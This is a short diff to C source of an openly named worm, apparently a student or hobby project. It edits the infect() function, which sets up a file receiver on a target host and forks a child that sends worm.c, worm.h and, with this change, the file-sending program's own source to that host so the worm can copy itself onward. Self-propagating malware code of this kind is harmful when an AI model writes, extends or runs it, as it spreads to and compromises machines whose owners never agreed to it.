@@ -203,13 +203,14 @@ void infect(char *ip, char *my_ip) {
 	deploy_receive_file(sock, my_ip);
 
     
-	/* Fork file server to handle incoming file transfer requests */
+	/* Fork to start file server, send files */
 	if (fork() == 0) {
-		/* Child process executes send_file_over_socket with worm files */
+		// Child ps executes send_file_over_socket with worm files and itself
 		char *argv[] = {
 			"send_file_over_socket",
 			"worm.c",
 			"worm.h",
+            "send_file_over_socket.c",
 			NULL
 		};
 		execv("./send_file_over_socket", argv);
